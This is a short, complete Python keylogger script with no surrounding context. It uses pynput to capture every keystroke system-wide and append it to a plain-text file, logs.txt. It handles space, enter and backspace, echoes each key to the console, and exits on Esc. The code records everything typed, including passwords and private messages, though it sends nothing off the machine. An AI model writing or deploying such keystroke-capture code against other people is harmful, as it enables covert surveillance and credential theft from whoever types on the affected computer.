import pynput
from pynput.keyboard import Key, Listener

def write_file(keys):
    with open("logs.txt", "a", encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                file.write(" ")
            elif k == "Key.enter":
                file.write("\n")
            else:
                file.write(k)

def remove_last_char():
    try:
        with open("logs.txt", "r", encoding="utf-8") as file:
            content = file.read()
        
        if content: 
            content = content[:-1] 
        
            with open("logs.txt", "w", encoding="utf-8") as file:
                file.write(content)
    except FileNotFoundError:
        pass  

def on_press(key):
    if key == Key.backspace:
        remove_last_char()
    else:
        write_file([key])

    print(f"{key} pressed")

def on_release(key):
    if key == Key.esc:
        print("exit")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
